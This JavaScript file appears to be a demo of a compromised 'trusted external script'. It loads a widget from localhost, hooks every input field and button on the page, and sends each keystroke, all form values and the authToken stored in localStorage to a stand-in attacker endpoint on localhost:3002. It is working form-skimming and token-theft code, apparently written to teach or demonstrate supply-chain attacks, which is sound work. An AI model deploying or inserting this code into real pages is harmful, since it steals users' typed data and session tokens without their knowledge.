document.addEventListener('DOMContentLoaded', () => {
    // Fetch and prepend the widget
    fetch('http://localhost:4307/widget.html')
        .then(response => response.text())
        .then(html => {
            const div = document.createElement('div');
            div.innerHTML = html;
            document.body.insertBefore(div.firstElementChild, document.body.firstChild);
        })
        .catch(err => console.error('Error loading widget:', err));

    // document.body.style.backgroundColor = 'gray';
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('input', () => {
            const value = input.value;
            console.log('Trusted external script (exploited) | input value changed:', value);
            fetch('http://localhost:3002/attacker-url-that-seems-trustworthy', {
                method: 'POST',
                body: JSON.stringify({
                    field: input.placeholder || 'unknown',
                    value: value,
                    authToken: localStorage.getItem('authToken')
                }),
                headers: {
                    'Content-Type': 'application/json'
                }
            })
                .then(res => console.log('Trusted external script executes the POST request towards attacker | Fetch response:', res.status))
                .catch(err => console.error('Trusted external script | Error sending data:', err));
        });
    });

    const buttons = document.querySelectorAll('button');
    buttons.forEach(button => {
        button.addEventListener('click', () => {
            const allInputs = {};
            document.querySelectorAll('input').forEach(input => {
                allInputs[input.placeholder || input.name || input.id || 'unknown'] = input.value;
            });

            console.log('Trusted external script (exploited) | button clicked, sending all data');
            fetch('http://localhost:3002/attacker-url-that-seems-trustworthy', {
                method: 'POST',
                body: JSON.stringify({
                    event: 'button_click',
                    formData: allInputs,
                    authToken: localStorage.getItem('authToken')
                }),
                headers: {
                    'Content-Type': 'application/json'
                }
            })
                .then(res => console.log('Trusted external script | Button click data sent | Fetch response:', res.status))
                .catch(err => console.error('Trusted external script | Error sending button click data:', err));
        });
    });
});
